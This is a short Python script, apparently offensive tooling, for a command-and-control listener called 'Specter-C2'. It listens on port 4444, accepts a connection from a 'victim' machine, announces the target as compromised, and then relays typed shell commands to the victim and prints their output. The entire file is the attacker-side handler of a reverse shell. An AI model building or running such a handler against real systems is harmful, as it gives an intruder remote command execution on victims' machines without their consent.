import socket

def launch_c2():
    # 0.0.0.0 allows the server to listen on all available network interfaces
    HOST = '0.0.0.0' 
    PORT = 4444      

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    
    print(f"[*] Specter-C2 Online. Waiting for incoming beacon...")

    # Accept the connection from the victim machine
    victim, addr = server.accept()
    print(f"[+] SUCCESS: Target {addr[0]} has been compromised.")

    while True:
        # Professional shell prompt for the hacker
        cmd = input("Specter-Shell> ")
        
        if cmd.lower() == "exit":
            victim.send(b"exit")
            break
            
        if not cmd.strip():
            continue

        # Send command to the victim
        victim.send(cmd.encode())
        
        # Receive and display the output of the command from the victim
        result = victim.recv(16384).decode()
        print(result)

    victim.close()
    server.close()

if __name__ == "__main__":
    launch_c2()